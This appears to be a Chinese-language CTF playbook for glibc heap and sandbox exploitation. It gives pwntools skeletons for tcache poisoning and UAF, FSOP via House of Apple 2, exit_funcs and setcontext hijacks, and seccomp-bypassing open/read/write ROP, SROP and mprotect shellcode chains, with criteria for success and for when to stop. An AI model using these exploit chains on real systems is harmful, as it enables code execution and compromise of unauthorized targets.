# heap-and-sandbox.md — tcache/UAF、IO_FILE 与 seccomp ORW

> 配套 `pwn-crypto/SKILL.md`。所有脚本仅用于授权靶场；先记录 checksec、glibc 版本、sha256。
> 本文只给“可运行骨架 + 判据”，偏移一律用当前 libc/调试器复核，不抄死数字。

**本域输入面**：本文件给 tcache/UAF、IO_FILE、seccomp ORW 的骨架与版本判据，偏移必须用目标 libc 复核。
**路由**：没有目标 libc 的盲打按 `mitigation-matrix.md` 的先验处理；非 glibc 分配器（如 Windows 堆）走对应平台卷；目标范围由 `scope` 声明。
## 0. 堆题开局（先定版本与分配器）

```bash
ldd --version | head -1
strings -a libc.so.6 | grep -m1 'GNU C Library'
python3 - <<'PY'
from pwn import *
e = ELF('./chall', checksec=False)
print(hex(e.symbols.get('__free_hook', 0)), hex(e.symbols.get('_IO_list_all', 0)))
PY
```

| glibc | 关键变化 | 打法影响 |
|---|---|---|
| 2.26+ | tcache 引入 | 每 size 最多 7 个，LIFO，无检查 |
| 2.29+ | tcache `key` 字段 | 二次 free 需绕过 `e->key == tcache` |
| 2.32+ | safe-linking | `fd = target ^ (chunk_addr >> 12)` |
| 2.34+ | `__free_hook`/`__malloc_hook` 移除 | 改走 IO_FILE/exit_funcs/程序指针 |
| 2.35+ | 更多 IO vtable/一致性检查 | 先确认目标 libc 的 vtable 范围 |

**判据**：libc build id 或泄漏低 12 位与本地 libc 吻合；能说出 tcache count、safe-linking 是否启用。

### 0.1 版本三连：把“2.3x”变成可引用的字符串

```bash
ldd --version | head -1
strings -a libc.so.6 | grep -m1 'GNU C Library'
readelf -n libc.so.6 | grep -A1 'Build ID'
python - <<'PY'
from pwn import *
libc = ELF("./libc.so.6", checksec=False)
for s in ("__free_hook", "__malloc_hook", "_IO_list_all", "main_arena"):
    print(s, hex(libc.symbols.get(s, 0)))
PY
```

通过长什么样：

```text
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) stable release version 2.35.
    Build ID: 5b1a2f0c9d1e4b7a
__free_hook 0x0
__malloc_hook 0x0
_IO_list_all 0x21a6a0
main_arena 0x21ac80
```

读法：`0x0` = 该版本**没有**这个符号（2.34+ 删了 hook），不是“偏移算错”。
有符号但偏移与网上教程不同 → 以 build id 为准；报告里必须带这两行，否则偏移不可复现。

## 1. tcache / UAF 骨架

```python
from pwn import *
context.binary = elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process(elf.path)

def add(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size> ', str(size).encode())
    p.sendafter(b'data> ', data)

def free(i):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx> ', str(i).encode())

def edit(i, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx> ', str(i).encode())
    p.sendafter(b'data> ', data)

def show(i):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx> ', str(i).encode())
    return p.recvline().strip()
```

### 1.1 泄漏顺序

1. **堆**：释放两个同 size chunk，读第一个的 `fd`；2.32+ 先解码 `fd ^ (chunk >> 12)`。
2. **libc**：填满对应 tcache（7 个），再释放一个进 unsorted bin，读 `fd/bk`；
   `main_arena` 偏移用 `libc.symbols` 或 gdb 的 `p &main_arena` 确认。
3. **栈**：libc 基址 + `environ` 偏移，读 `environ` 得栈地址；再回栈找返回地址。

```python
def dec(x, where):  # 2.32+
    return x ^ (where >> 12)
def enc(x, where):
    return x ^ (where >> 12)
```

**判据**：泄漏值页对齐；`vmmap` 中对应段名正确；解码后的 fd 是堆地址/0。

### 1.2 tcache poison

```python
# 1) 同一 chunk 入链两次：free(a); edit(a, ...); free(a)
#    2.29+ 先清 key，且确认 count < 7
# 2) 改 fd 指向 target（按 0x10 对齐）
edit(0, p64(enc(target, chunk_addr)))
add(size)                 # 取回原 chunk
add(size)                 # malloc 返回 target
```

- target 优先级：`__free_hook`（<2.34）→ `_IO_list_all`/`exit_funcs`（≥2.34）
  → 程序自身函数指针 → `environ` 回栈。
- 目标可写且对齐；写 `system` 时把 `"/bin/sh\0"` 放到已知 chunk。
- 2.34+ 不要找 `__free_hook`，符号不存在不是“偏移错了”。

**判据**：`malloc` 返回 `target`；`vis_heap_chunks` 能看到重复/重叠；触发后不 abort。
**失败先查**：tcache count 已满、`key` 未清、safe-linking 未编码、target 未 0x10 对齐。

### 1.3 堆利用常见形态（先对形态，再写代码）

| 形态 | 前置 | 判据 | 失败信号 |
|---|---|---|---|
| tcache dup | 能对同一 chunk 两次 free（2.29+ 先清 `key`，count<7） | 两次 `malloc` 返回同一地址 | count 已满、`key` 未清、double free 检查 |
| UAF | free 后仍能 `show/edit` | `show` 读到已释放内容；`edit` 影响新分配 | chunk 被合并、指针被置空 |
| off-by-one(null) | 写入比 size 多 1 字节 | 下一 chunk 的 `size` 低位被改，出现重叠 | 只改到 padding；prev_inuse 未变 |
| unsorted bin 泄漏 | 填满对应 tcache（7 个）后释放大 chunk | `fd/bk` 是 `main_arena` 地址，页对齐 | 未填满 → 直接进 tcache，看不到 libc |
| tcache stashing unlink | 小 bin 链 + 一次大请求 | 大 chunk 被返回受控地址 | 2.31+ 的链检查（`bck->fd` 校验） |
| house of botcake | 7 个 tcache + 双 free 进 unsorted | 两个 chunk 重叠，可改 fd | 2.31–2.35 常见，2.36+ 现场复核 |
| large bin attack | 能改 `bk_nextsize` 且触发 large bin 插入 | 目标地址被写入堆指针 | 2.30+ 增加了 `bk_nextsize` 检查 |

判据统一为“`malloc` 返回 target / 重叠可见 / 触发不 abort”，外加**版本号**。
没有版本号的堆结论一律“疑似”：同一份代码在 2.31 与 2.35 上是两条不同的链。

## 2. IO_FILE / FSOP（2.34+ 常用）

```text
触发链：exit() -> _IO_flush_all_lockp() -> _IO_OVERFLOW(fp)
伪造：_IO_FILE_plus 在可写堆；vtable 必须落在 __libc_IO_vtables 范围
House of Apple 2：vtable = _IO_wfile_jumps
  _flags = 0
  _IO_write_ptr > _IO_write_base
  _wide_data->_IO_write_base = 0
  _wide_data->_IO_write_ptr  = 1
  _wide_data->_wide_vtable   = fake_wvt
  fake_wvt->__doallocate     = system
  _lock 指向可写零页
```

```python
# 只给字段布局；地址/偏移用当前 libc 填
fake = flat({
    0x00: 0,                          # _flags
    0x20: 0,                          # _IO_write_base
    0x28: 1,                          # _IO_write_ptr > base
    0x88: lock_addr,                  # _lock
    0xA0: wide_data_addr,             # _wide_data
    0xD8: libc.symbols['_IO_wfile_jumps'],
}, length=0xE0)
# _wide_data + 0x18/0x20 设 write_base/write_ptr；+0xE0 放 fake wide vtable
```

- 触发前把 `_IO_list_all` 指向 fake，或走 `exit_funcs` 的 `__run_exit_handlers`。
- 先确认 `_IO_wfile_jumps` 在目标 libc 中存在；不同发行版可能裁剪。
- 任何 vtable 越界都会触发 `_IO_vtable_check` abort，不要伪造到堆上。

**判据**：gdb 断在 `_IO_wfile_overflow`/`system`，`bt` 能看到 flush 链；
`p _IO_list_all` 指向伪造结构。
**失败先查**：vtable 不在合法段、`_wide_data` 未映射、`_lock` 为空、触发路径没走 flush。

## 3. seccomp 与 ORW

```bash
seccomp-tools dump ./chall
# 记录 arch、allowed syscall、参数过滤；没有工具时 strace -f 观察
```

x86_64 常用号：`read=0 write=1 open=2 close=3 mprotect=10 openat=257 sendfile=40`。
先判断 flag 是否已被父进程打开：若允许 `read`，先试 `read(3, bss, 0x100)`。

### 3.1 经典 open/read/write

```python
flag = next(libc.search(b'/flag\x00'))
bss = elf.bss() + 0x200
rop = ROP(libc)
rop.call(libc.symbols['open'], [flag, 0])
rop.call(libc.symbols['read'], [3, bss, 0x100])
rop.call(libc.symbols['write'], [1, bss, 0x100])
p.sendline(flat({OFFSET: rop.chain()}))
print(p.recvall(timeout=3))
```

### 3.2 只有 openat / 缺 pop rdx

```python
# openat(AT_FDCWD=-100, path, 0)
rop.call(libc.symbols['openat'], [-100, flag, 0])
# 缺 gadget：ret2csu 设 rdx/rsi/rdi；或 SROP
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bss
frame.rsi = frame.rdx = 0
frame.rip = syscall_ret
payload = flat({OFFSET: [syscall_ret, frame]})
```

### 3.3 允许 mprotect

```python
rop.call(libc.symbols['read'], [0, bss, 0x200])
rop.call(libc.symbols['mprotect'], [bss & ~0xfff, 0x1000, 7])
rop.call(bss)
p.sendline(flat({OFFSET: rop.chain()}) + asm(shellcraft.cat('/flag')))
```

**判据**：`strace`/seccomp 日志出现预期 `openat/read/write`（或 `open/read/write`），
输出包含 flag；shellcode 路线要看到 `mprotect(...,7)` 返回 0。
**失败先查**：fd 猜错、路径不在可写内存、`openat` 第一参数不是 -100、x32 ABI 混用。

### 3.4 BPF 判读：先读 arch，再读白名单

```bash
seccomp-tools dump ./chall | head -40
strace -f -e trace=execve,execveat,open,openat,read,write ./chall 2>&1 | tail -30
```

通过长什么样（能直接读出“允许什么”）：

```text
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != AUDIT_ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x00000000  if (A == read) goto 0005
 0004: 0x15 0x00 0x01 0x00000001  if (A == write) goto 0005
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

读三条就够：`arch` 是否限定 x86_64（限定则 x32/int 0x80 绕过无效）；白名单里有没有
`openat/read/write`；有没有参数过滤（如只允许 `read(0,..)`）。缺 `seccomp-tools` 时，
`strace` 只能看到**实际发生**的 syscall，不能当完整白名单——报告里要写明这一点。

## 4. 失败判据与止损

- 连续 3 轮同一路径无进展（泄漏不变、目标不可写、触发必 abort）→ 换路线。
- 同一目标同类动态尝试最多 2 次；第二次失败必须停下汇报。
- 只“本地偶然成功”不算通过：全新进程 ≥9/10 成功，远程有 flag/root 证据。
- 记录已排除路线：例如 “Full RELRO + 无泄漏，GOT 路线不可行”“2.34 无 free_hook”。

## 5. 证据清单

```text
checksec 四项 + glibc build id + sha256(chall/libc)
seccomp 白名单原文
泄漏值 -> 基址计算过程
每次 malloc/free 的 size/index 与堆状态截图
exploit.py 运行 10 次成功计数
flag/root 输出与会话时间
```

### 5.1 证据包自检（交付前 30 秒）

```bash
# 【占位符】把 <...> 换成你的真实路径/端口/参数后再执行
python - <<'PY'
import json, pathlib
need = ["evidence/checksec.txt", "evidence/leak.txt", "exploit.py"]
miss = [p for p in need if not pathlib.Path(p).is_file()]
runs = list(pathlib.Path("runs").glob("run.*")) if pathlib.Path("runs").is_dir() else []
print("miss", miss, "runs", len(runs))
print("evidence_ok", not miss and len(runs) >= 10)
PY
```

通过长什么样：`miss [] runs 10` + `evidence_ok True`。
少于 10 份运行日志，就不能写“稳定”；只能在报告里写“当前最好结果 + 失败率”。

## 6. glibc 2.34+ 现实（`__free_hook`/`__malloc_hook` 移除后的四条路）

2.34 起两个 hook 符号已从 libc 删除：`nm -D libc.so.6 | grep -E '__free_hook|__malloc_hook'`
返回空不是“偏移算错”，是路线失效。下面四路互相独立，末尾字段名可机检。

### 6.1 FSOP：`_IO_wfile_jumps` / `_IO_str_jumps`（House of Apple 2）
- 触发条件：有可写堆 + 程序会 `exit()`/`fflush(NULL)`；能覆盖 `_IO_list_all` 或 `_IO_2_1_stderr_` 为 fake `_IO_FILE_plus`（2.35+ 先过 `_IO_vtable_check`）。
- 命令：`gdb -q ./chall -ex 'b _IO_flush_all_lockp' -ex 'p _IO_list_all' -ex 'x/gx _IO_list_all'`；pwndbg `vmmap` 看 vtable 是否落在 `__libc_IO_vtables`。
- 判据：`io_file_vtable` ∈ {`_IO_wfile_jumps`,`_IO_str_jumps`}；`bt` 出现 `_IO_wfile_overflow → __doallocate → system`；`fsop_works=true` 必须有 shell/marker 回显。
- 失败判据：`_IO_vtable_check` abort、`_wide_data`/`_lock` 未映射、`_flags!=0` 不进 `_IO_OVERFLOW` → 记 `fsop_works=false` 并保留 abort 栈。

### 6.2 退出链：`exit_funcs`（`__run_exit_handlers`）
- 触发条件：能写 libc 的 `exit_funcs` 链表或 `initial`（2.34+ 指针经 `PTR_MANGLE`），且程序正常 `return/exit()`。
- 命令：`gdb -q ./chall -ex 'b __run_exit_handlers' -ex 'p exit_funcs' -ex 'p *exit_funcs'`；单步到 `__call_tls_dtors`/`_dl_fini` 前核对 `flavor` 与函数指针。
- 判据：`exit_funcs_target` 指向受控函数，且 `__run_exit_handlers` 断点命中后它真的执行（marker/`system` 回显）。
- 失败判据：只改了指针但进程走 `_exit()`/`abort()` 跳过 handler、`PTR_MANGLE` 未解码（`rol(ptr^guard,17)`，按目标 libc 复核）→ 判死，不重试同一偏移。

### 6.3 `tls_dtor_list`（`__call_tls_dtors`）
- 触发条件：TLS 可写（`fs:[0]`/pthread 结构）+ 程序调 `exit()` 且存在 thread_local/C++ 析构（`__cxa_thread_atexit`）。
- 命令：`gdb -q ./chall -ex 'b __call_tls_dtors' -ex 'p tls_dtor_list' -ex 'p *tls_dtor_list'`；命中后 `p/x ((struct dtor_list*)$rax)->func`。
- 判据：`tls_dtor_hit=true`（断点命中且 `func` 等于受控地址、`obj` 指向可控参数），随后 marker 出现。
- 失败判据：`tls_dtor_list` 为 NULL（无 thread_local 析构）、指针被 `PTR_MANGLE` 未解码、`exit` 前已 `_exit` → 换 6.2。

### 6.4 `setcontext` 链（栈迁移，`__free_hook` 的直接替代）
- 触发条件：能控一个函数指针（`exit_funcs`/`tls_dtor`/`_IO_OVERFLOW` 的 `__doallocate`）+ 已知 libc 基址；目标 libc 仍有可从 `ucontext->uc_mcontext.gregs` 恢复 `rsp/rip` 的 `setcontext` 入口。
- 命令：`gdb -q ./chall -ex 'disassemble setcontext' -ex 'b *setcontext+61'`；pwndbg `rop --grep setcontext`，再 `p/x $rdi` 与伪造 ucontext 对比。
- 判据：命中入口后 `rsp` 落到伪造 `ucontext` 指定的栈、链上第一个 gadget 执行（`x/i $rip` 与 payload 对齐）；偏移按目标 libc 复核，不抄死数字。
- 失败判据：该 libc 的 `setcontext` 不再从同一 `gregs` 槽取 `rsp`（2.34 后序变化）、`rdi` 不可控 → 改用 6.1 直接打 `system`。

**字段速查**：`io_file_vtable`（6.1）· `exit_funcs_target`（6.2）· `tls_dtor_hit`（6.3）· `fsop_works`（6.1/6.4 汇总）。字段缺失或为 `true` 却无 marker → 判据不成立。

## 失败判据（本文件）

- 只抄骨架里的偏移/gadget，不用目标环境复核 → 本文件被误用，结论降级为“疑似”。
- 没有泄漏/回代/写后读回等最小证据就宣布成功 → 不成立。
- 平台语义混用（PE 的 DllCharacteristics 当 ELF RELRO、UCRT 当 glibc）→ 判路线错误。

## 边界

- 文中的命令与偏移是示例，必须用目标二进制、目标 libc/运行库重新生成。
- 仅用于授权实验室资产；不覆盖真实生产系统、持久化、横向移动或拒绝服务。

## 这一篇算"用对了"吗

- [ ] 先有 libc 版本 + build id 三连，再选形态；没有版本号的堆结论已标疑似。
- [ ] 堆原语有 `malloc` 返回 target / 重叠 chunk / 触发不 abort 的证据，不只泄漏堆地址。
- [ ] 2.32+ 的 fd 用 `target ^ (chunk>>12)` 编码，2.34+ 没再找 `__free_hook`。
- [ ] FSOP/exit/tls_dtor/setcontext 四条路各写了触发条件与失败判据，vtable 不越界。
- [ ] seccomp 读完了 arch 与白名单；ORW 的 syscall 序列有 `strace`/BPF 对照。
